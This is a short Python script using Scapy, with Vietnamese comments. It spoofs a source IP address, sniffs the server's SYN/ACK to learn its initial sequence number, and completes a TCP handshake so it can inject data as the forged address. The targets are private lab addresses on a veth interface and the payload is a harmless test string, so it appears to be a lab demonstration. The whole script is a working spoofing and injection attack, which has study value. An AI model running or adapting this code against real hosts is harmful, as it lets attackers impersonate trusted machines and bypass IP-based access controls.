#!/usr/bin/env python3
# spoof_sniff.py - Hoàn tất bắt tay TCP 3 bước với địa chỉ IP nguồn giả mạo bằng Scapy
from scapy.all import IP, TCP, send, sniff, RandShort
import sys

victim = "10.0.0.2"
spoof = "10.0.0.77"
dport = 9000
sport = int(RandShort())  # Sinh cổng nguồn ngẫu nhiên tránh xung đột socket TIME_WAIT

print(f"[*] Target: {victim}:{dport} | Spoofed IP: {spoof}:{sport}")
print(f"[*] Step 1: Sending SYN with SPOOFED source IP ({spoof}) to {victim}:{dport}...")
send(IP(src=spoof, dst=victim)/TCP(sport=sport, dport=dport, flags="S", seq=1000), verbose=0)

print(f"[*] Step 2: Sniffing for SYN/ACK on interface veth1 (sport={sport})...")
sa = sniff(iface="veth1", timeout=3, count=1,
           lfilter=lambda p: p.haslayer(TCP) and p[TCP].dport == sport and (p[TCP].flags & 0x12) == 0x12)

if not sa:
    print("[-] Error: Did not capture SYN/ACK packet within timeout!", file=sys.stderr)
    sys.exit(1)

isn = sa[0][TCP].seq
print(f"[+] Successfully captured SYN/ACK! Real Server ISN = {hex(isn)} ({isn})")

print(f"[*] Step 3: Sending ACK with ack = ISN + 1 ({isn + 1}) to complete 3-way handshake...")
send(IP(src=spoof, dst=victim)/TCP(sport=sport, dport=dport, flags="A",
     seq=1001, ack=isn + 1), verbose=0)

print(f"[*] Step 4: Sending PSH+ACK payload data 'hello-from-spoofed-source'...")
send(IP(src=spoof, dst=victim)/TCP(sport=sport, dport=dport, flags="PA",
     seq=1001, ack=isn + 1)/b"hello-from-spoofed-source\n", verbose=0)

print(f"[+] Done! Successfully transmitted spoofed payload as {spoof} to {victim}:{dport}")
